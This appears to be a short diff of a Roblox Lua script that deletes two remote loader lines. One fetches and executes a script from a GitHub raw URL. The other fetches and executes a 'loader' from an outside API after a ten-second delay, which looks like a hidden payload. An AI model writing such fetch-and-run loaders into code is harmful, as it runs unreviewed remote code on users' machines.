@@ -1,6 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/spotyfyy6t-spec/mm2value/refs/heads/main/MM2valueINmm2"))()
 
-task.spawn(function()
-    task.wait(1 * 10)
-    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjQ2NzUyOTgwLTUzNmMtNGY3Yi05ZWFjLTgxZDExMWRlMmU0MCIsImtpbmQiOiJsb2FkZXIifQ"))()
-end)
